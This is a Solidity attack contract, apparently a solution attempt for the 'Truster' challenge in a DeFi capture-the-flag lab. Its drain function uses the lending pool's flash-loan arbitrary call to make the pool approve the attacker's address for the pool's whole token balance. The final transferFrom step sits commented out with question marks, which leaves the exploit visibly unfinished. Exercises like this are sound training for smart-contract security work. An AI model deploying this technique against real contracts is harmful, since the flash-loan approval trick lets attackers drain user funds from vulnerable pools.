pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract AttackTruster {
    address private immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function drain(TrusterLenderPool pool, IERC20 token) public {
        uint256 amount = token.balanceOf(address(pool));

        // approve from pool
        TrusterLenderPool(pool).flashLoan(
            0,
            owner,
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                owner,
                amount
            )
        );

        // transfer approved tokens ??
        // token.transferFrom(address(pool), owner, 1);
    }
}
